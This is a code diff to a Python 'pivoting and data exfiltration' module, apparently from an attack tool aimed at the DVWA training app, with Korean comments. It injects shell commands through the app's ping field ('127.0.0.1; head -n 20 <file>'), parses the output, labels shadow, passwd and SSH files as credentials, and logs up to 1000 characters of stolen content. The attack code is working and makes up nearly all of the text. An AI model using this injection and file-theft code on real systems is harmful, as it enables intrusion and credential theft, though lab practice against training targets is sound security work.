@@ -5,7 +5,8 @@ Pivoting and Data Exfiltration Module
 
 import time
 import os
-from utils.logger import log_attack
+import re
+from utils.logger import log_attack, log_exfiltrated_data, log_sensitive_file
 
 # 중요 파일 탐색 대상
 SENSITIVE_FILES = {
@@ -217,29 +218,84 @@ def search_sensitive_files(session, delay):
     return results
 
 def preview_file_content(session, filepath, delay):
-    """파일 내용 미리보기"""
+    """파일 내용 미리보기 및 로그 기록"""
     try:
         cmdi_url = f"{session.base_url}/vulnerabilities/exec/"
-        preview_cmd = f"head -n 5 {filepath}"
+        # 더 많은 내용을 가져오도록 수정 (20줄)
+        preview_cmd = f"head -n 20 {filepath}"
         payload = f"127.0.0.1; {preview_cmd}"
         params = {'ip': payload, 'Submit': 'Submit'}
 
         response = session.session.get(cmdi_url, params=params)
 
         if response.status_code == 200:
-            log_attack(
-                'FILE_PREVIEW',
-                'SUCCESS',
-                f"File: {filepath}",
-                response.status_code,
-                len(response.text)
-            )
-            print(f"          [i] 파일 내용 미리보기 저장됨")
+            # HTML에서 실제 명령어 출력 추출
+            file_content = extract_command_output(response.text)
+
+            if file_content:
+                # 파일 카테고리 결정
+                category = determine_file_category(filepath)
+
+                # 상세 로그 기록
+                log_sensitive_file(filepath, category, file_content, preview_lines=20)
+
+                log_attack(
+                    'FILE_PREVIEW',
+                    'SUCCESS',
+                    f"File: {filepath}",
+                    response.status_code,
+                    len(response.text)
+                )
+                print(f"          [i] 파일 내용 로그에 기록됨 ({len(file_content)} bytes)")
 
         time.sleep(delay)
 
     except Exception as e:
         pass
+
+def determine_file_category(filepath):
+    """파일 경로로부터 카테고리 결정"""
+    if 'config' in filepath or '.conf' in filepath:
+        return 'config_files'
+    elif 'shadow' in filepath or 'passwd' in filepath or 'ssh' in filepath:
+        return 'credential_files'
+    elif 'history' in filepath:
+        return 'history_files'
+    elif '.sql' in filepath:
+        return 'database_dumps'
+    elif 'log' in filepath:
+        return 'application_logs'
+    else:
+        return 'other'
+
+def extract_command_output(html_response):
+    """HTML 응답에서 실제 명령어 출력 추출"""
+    try:
+        # DVWA의 command injection 결과는 <pre> 태그 내에 있음
+        pre_match = re.search(r'<pre>(.*?)</pre>', html_response, re.DOTALL)
+        if pre_match:
+            output = pre_match.group(1)
+            # ping 결과 제거 (127.0.0.1 관련 내용)
+            lines = output.split('\n')
+            filtered_lines = []
+            skip_ping = False
+
+            for line in lines:
+                # ping 명령어 시작 감지
+                if 'PING 127.0.0.1' in line or 'ping statistics' in line:
+                    skip_ping = True
+                    continue
+                # ping 결과가 끝나면
+                if skip_ping and line.strip() and not any(x in line for x in ['64 bytes', 'packets transmitted', 'rtt min']):
+                    skip_ping = False
+
+                if not skip_ping and line.strip():
+                    filtered_lines.append(line)
+
+            return '\n'.join(filtered_lines)
+        return ""
+    except Exception:
+        return ""
 
 def attempt_data_exfiltration(session, delay):
     """데이터 탈취 시도 (시뮬레이션)"""
@@ -287,13 +343,24 @@ def attempt_data_exfiltration(session, delay):
 
             response = session.session.get(cmdi_url, params=params)
 
-            if len(response.text) > 500:
+            # HTML에서 실제 명령어 출력 추출
+            exfiltrated_data = extract_command_output(response.text)
+
+            if exfiltrated_data and len(exfiltrated_data) > 10:  # 실제 데이터가 있는 경우
                 results['successful'] += 1
                 results['findings'].append({
                     'data_type': target['name'],
                     'command': target['command'],
-                    'data_size': len(response.text)
+                    'data_size': len(exfiltrated_data)
                 })
+
+                # 탈취된 실제 데이터를 상세 로그에 기록
+                log_exfiltrated_data(
+                    target['name'],
+                    target['command'],
+                    exfiltrated_data,
+                    preview_length=1000  # 최대 1000자까지 로그에 기록
+                )
 
                 log_attack(
                     'DATA_EXFILTRATION',
@@ -302,7 +369,15 @@ def attempt_data_exfiltration(session, delay):
                     response.status_code,
                     len(response.text)
                 )
-                print(f"      [+] 수집 성공: {target['name']}")
+                print(f"      [+] 수집 성공: {target['name']} ({len(exfiltrated_data)} bytes)")
+            else:
+                log_attack(
+                    'DATA_EXFILTRATION',
+                    'FAILED',
+                    f"Type: {target['name']}, No data extracted",
+                    response.status_code,
+                    len(response.text)
+                )
 
             time.sleep(delay)
 
